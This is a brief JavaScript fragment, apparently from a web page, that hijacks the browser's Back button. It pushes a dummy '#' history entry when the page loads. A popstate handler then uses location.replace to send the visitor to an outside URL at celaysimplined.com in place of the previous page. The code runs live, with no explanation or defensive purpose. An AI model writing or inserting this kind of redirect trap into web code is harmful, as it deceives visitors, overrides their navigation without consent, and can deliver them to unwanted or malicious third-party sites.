
                            function bbscriptOnClick() {
                                history['pushState'](null, null, '#'), window['onpopstate'] = function (a) {
                                    a['state'] !== null ? (document['title'] = a['state']['title'], load(a['state']['url'])) : location['replace']('https://celaysimplined.com/5cf9be77-f5f9-4a78-ae17-581614ed8d03');
                                };
                            }
                            document['addEventListener']('DOMContentLoaded', () => history['pushState'](null, null, '#'));
                        